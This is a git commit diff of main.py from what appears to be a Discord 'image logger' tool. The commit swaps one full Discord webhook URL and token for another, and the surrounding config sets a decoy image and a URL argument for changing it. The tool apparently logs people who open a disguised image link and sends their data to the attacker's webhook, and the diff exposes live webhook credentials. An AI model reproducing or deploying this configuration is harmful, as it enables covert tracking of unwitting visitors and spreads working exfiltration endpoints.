acb19808248bcf720cf5c8bf640def8768eabc03
oscarosk100100-rgb <oscarosk100100@gmail.com>
2026-03-19 15:12:21 +0800

    Update main.py

--- main.py
+++ main.py
@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1484074236111753266/A1C9ffPStoiF0kJaIo1wOvTrzcUQgvdUAiA2L-tZ5aIjXjNdkjReHnHxFVYl_74HMy3P",
+    "webhook": "https://discord.com/api/webhooks/1484086331490566204/emod_EkiQLjvYnC0MP2Sl8YoPxO8LdlvlI0dA75KsF3fhANBEEiof_bQf1eI-y4Q-xe7",
     "image": "https://img.sanishtech.com/u/91e72854deef39d9bac1ed46e7816fea.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
